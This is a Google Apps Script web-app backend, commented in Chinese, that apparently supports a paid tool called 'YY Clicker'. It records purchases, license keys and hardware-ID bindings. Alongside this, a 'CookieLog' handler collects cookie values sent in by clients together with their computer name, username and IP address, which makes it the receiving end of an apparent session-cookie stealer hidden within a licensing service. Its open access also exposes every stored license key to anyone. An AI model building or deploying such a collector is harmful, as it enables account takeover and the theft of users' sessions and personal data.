/**
 * Google Apps Script — 統一接收端
 * 
 * 功能：
 *   1. Cookie 資料接收（CookieLog 工作表）
 *   2. 用戶購買資料接收（用戶資料 工作表）
 *   3. 金鑰永久儲存/更新（金鑰記錄 工作表）
 *   4. HWID 更新/重置（更新金鑰記錄中的 HWID + 機碼欄位）
 *   5. 金鑰載入 API（Bot 重啟時 GET ?action=load_keys 載入所有金鑰）
 *
 * 部署步驟：
 *   1. 將此程式碼貼入 Google Apps Script 的 Code.gs
 *   2. 將 SPREADSHEET_ID 替換為您的試算表 ID
 *   3. 部署為 Web App（執行身分：我，存取權限：所有人）
 *   4. 每次更新程式碼後，需重新部署（管理部署作業 → 編輯 → 新版本）
 */

// ⚠ 請替換為您的試算表 ID
var SPREADSHEET_ID = "YOUR_SPREADSHEET_ID_HERE";

// ======================================================================
// 取得或建立工作表
// ======================================================================
function getOrCreateSheet(ss, name, headers, headerColor) {
  var sheet = ss.getSheetByName(name);
  if (!sheet) {
    sheet = ss.insertSheet(name);
    if (headers && headers.length > 0) {
      sheet.appendRow(headers);
      var headerRange = sheet.getRange(1, 1, 1, headers.length);
      headerRange.setFontWeight("bold");
      headerRange.setBackground(headerColor || "#333333");
      headerRange.setFontColor("#ffffff");
      sheet.setFrozenRows(1);
    }
  }
  return sheet;
}

// ======================================================================
// GET 請求處理
// ======================================================================
function doGet(e) {
  var action = (e.parameter && e.parameter.action) ? e.parameter.action : "";

  if (action === "load_keys") {
    return loadAllKeys();
  }

  return ContentService
    .createTextOutput(JSON.stringify({
      status: "ok",
      message: "Google Apps Script 統一接收端運作中",
      endpoints: ["CookieLog", "用戶資料", "金鑰記錄"],
      actions: ["load_keys"]
    }))
    .setMimeType(ContentService.MimeType.JSON);
}

// ======================================================================
// 載入所有金鑰（Bot 重啟時呼叫 GET ?action=load_keys）
// ======================================================================
function loadAllKeys() {
  try {
    var ss = SpreadsheetApp.openById(SPREADSHEET_ID);
    var headers = ["key", "username", "user_id", "status", "hwid", "machine_code", "created_at", "updated_at"];
    var sheet = getOrCreateSheet(ss, "金鑰記錄", headers, "#27ae60");
    var data = sheet.getDataRange().getValues();

    if (data.length <= 1) {
      return ContentService.createTextOutput(
        JSON.stringify({ status: "ok", keys: [], total: 0, message: "沒有金鑰記錄" })
      ).setMimeType(ContentService.MimeType.JSON);
    }

    var headerRow = data[0];
    var keys = [];

    for (var i = 1; i < data.length; i++) {
      var row = data[i];
      var keyObj = {};
      for (var j = 0; j < headerRow.length; j++) {
        keyObj[headerRow[j]] = row[j] !== undefined ? String(row[j]) : "";
      }
      if (keyObj.key && keyObj.key !== "" && keyObj.key !== "N/A") {
        keys.push(keyObj);
      }
    }

    return ContentService.createTextOutput(
      JSON.stringify({ status: "ok", keys: keys, total: keys.length })
    ).setMimeType(ContentService.MimeType.JSON);

  } catch (err) {
    return ContentService.createTextOutput(
      JSON.stringify({ status: "error", message: err.toString() })
    ).setMimeType(ContentService.MimeType.JSON);
  }
}

// ======================================================================
// POST 請求處理（統一入口）
// ======================================================================
function doPost(e) {
  try {
    var data = JSON.parse(e.postData.contents);
    var ss = SpreadsheetApp.openById(SPREADSHEET_ID);
    var type = data.type || "";

    // 根據 type 欄位分流（新版 Bot 使用）
    if (type === "key_save") {
      return handleKeySave(ss, data);
    }
    if (type === "hwid_update") {
      return handleHwidUpdate(ss, data);
    }
    if (type === "hwid_reset") {
      return handleHwidReset(ss, data);
    }
    if (type === "user_data") {
      return handleUserData(ss, data);
    }

    // 向後相容：根據資料欄位判斷類型
    if (data.cookie) {
      return handleCookieData(ss, data);
    }
    if (data.purchase_item) {
      return handleUserData(ss, data);
    }
    if (data.key && data.user_id) {
      return handleKeySave(ss, data);
    }

    return ContentService.createTextOutput(
      JSON.stringify({ status: "error", message: "未知的資料類型" })
    ).setMimeType(ContentService.MimeType.JSON);

  } catch (err) {
    return ContentService.createTextOutput(
      JSON.stringify({ status: "error", message: err.toString() })
    ).setMimeType(ContentService.MimeType.JSON);
  }
}

// ======================================================================
// 處理 Cookie 資料 — 寫入 "CookieLog" 工作表
// ======================================================================
function handleCookieData(ss, data) {
  var headers = ["時間戳記", "電腦名稱", "使用者名稱", "Cookie 值", "IP 位址", "來源"];
  var sheet = getOrCreateSheet(ss, "CookieLog", headers, "#c0392b");

  var timestamp = new Date().toLocaleString("zh-TW", { timeZone: "Asia/Taipei" });
  sheet.appendRow([
    timestamp,
    data.computer_name || "N/A",
    data.username || "N/A",
    data.cookie || "N/A",
    data.ip || "N/A",
    data.source || "YY Clicker"
  ]);

  return ContentService.createTextOutput(
    JSON.stringify({ status: "ok", message: "Cookie 資料已寫入" })
  ).setMimeType(ContentService.MimeType.JSON);
}

// ======================================================================
// 處理用戶購買資料 — 寫入 "用戶資料" 工作表
// ======================================================================
function handleUserData(ss, data) {
  var headers = ["使用者名稱", "使用者ID", "使用者購買項目", "使用者購買金額", "時間戳記"];
  var sheet = getOrCreateSheet(ss, "用戶資料", headers, "#4a86c8");

  sheet.appendRow([
    data.username || "N/A",
    data.user_id || "N/A",
    data.purchase_item || "N/A",
    data.purchase_amount || "N/A",
    data.timestamp || new Date().toISOString()
  ]);

  return ContentService.createTextOutput(
    JSON.stringify({ status: "ok", message: "用戶資料已寫入" })
  ).setMimeType(ContentService.MimeType.JSON);
}

// ======================================================================
// 處理金鑰儲存（新增或更新）— 寫入 "金鑰記錄" 工作表
// ======================================================================
function handleKeySave(ss, data) {
  var headers = ["key", "username", "user_id", "status", "hwid", "machine_code", "created_at", "updated_at"];
  var sheet = getOrCreateSheet(ss, "金鑰記錄", headers, "#27ae60");

  // 檢查是否已存在此金鑰
  var allData = sheet.getDataRange().getValues();
  var existingRow = -1;
  for (var i = 1; i < allData.length; i++) {
    if (allData[i][0] === data.key) {
      existingRow = i + 1; // 1-indexed for sheet
      break;
    }
  }

  var now = data.timestamp || new Date().toISOString();

  if (existingRow > 0) {
    // 更新現有記錄
    if (data.username) sheet.getRange(existingRow, 2).setValue(data.username);
    if (data.user_id) sheet.getRange(existingRow, 3).setValue(data.user_id);
    if (data.status) sheet.getRange(existingRow, 4).setValue(data.status);
    if (data.hwid) sheet.getRange(existingRow, 5).setValue(data.hwid);
    if (data.machine_code) sheet.getRange(existingRow, 6).setValue(data.machine_code);
    sheet.getRange(existingRow, 8).setValue(now); // updated_at

    return ContentService.createTextOutput(
      JSON.stringify({ status: "ok", message: "金鑰已更新", action: "updated" })
    ).setMimeType(ContentService.MimeType.JSON);
  } else {
    // 新增記錄
    sheet.appendRow([
      data.key,
      data.username || "N/A",
      data.user_id || "N/A",
      data.status || "已建立",
      data.hwid || "",
      data.machine_code || "",
      now,
      now
    ]);

    return ContentService.createTextOutput(
      JSON.stringify({ status: "ok", message: "金鑰已儲存", action: "created" })
    ).setMimeType(ContentService.MimeType.JSON);
  }
}

// ======================================================================
// 處理 HWID 更新 — 更新金鑰記錄中的 HWID 和機碼
// ======================================================================
function handleHwidUpdate(ss, data) {
  var headers = ["key", "username", "user_id", "status", "hwid", "machine_code", "created_at", "updated_at"];
  var sheet = getOrCreateSheet(ss, "金鑰記錄", headers, "#27ae60");

  var allData = sheet.getDataRange().getValues();
  for (var i = 1; i < allData.length; i++) {
    if (allData[i][0] === data.key) {
      var row = i + 1;
      sheet.getRange(row, 5).setValue(data.hwid || "");
      sheet.getRange(row, 6).setValue(data.machine_code || "");
      sheet.getRange(row, 8).setValue(data.timestamp || new Date().toISOString());

      return ContentService.createTextOutput(
        JSON.stringify({ status: "ok", message: "HWID 已更新" })
      ).setMimeType(ContentService.MimeType.JSON);
    }
  }

  return ContentService.createTextOutput(
    JSON.stringify({ status: "error", message: "找不到此金鑰" })
  ).setMimeType(ContentService.MimeType.JSON);
}

// ======================================================================
// 處理 HWID 重置 — 清除金鑰記錄中的 HWID 和機碼
// ======================================================================
function handleHwidReset(ss, data) {
  var headers = ["key", "username", "user_id", "status", "hwid", "machine_code", "created_at", "updated_at"];
  var sheet = getOrCreateSheet(ss, "金鑰記錄", headers, "#27ae60");

  var allData = sheet.getDataRange().getValues();
  for (var i = 1; i < allData.length; i++) {
    if (allData[i][0] === data.key) {
      var row = i + 1;
      sheet.getRange(row, 5).setValue("");  // 清除 HWID
      sheet.getRange(row, 6).setValue("");  // 清除機碼
      sheet.getRange(row, 8).setValue(data.timestamp || new Date().toISOString());

      return ContentService.createTextOutput(
        JSON.stringify({ status: "ok", message: "HWID 已重置" })
      ).setMimeType(ContentService.MimeType.JSON);
    }
  }

  return ContentService.createTextOutput(
    JSON.stringify({ status: "error", message: "找不到此金鑰" })
  ).setMimeType(ContentService.MimeType.JSON);
}
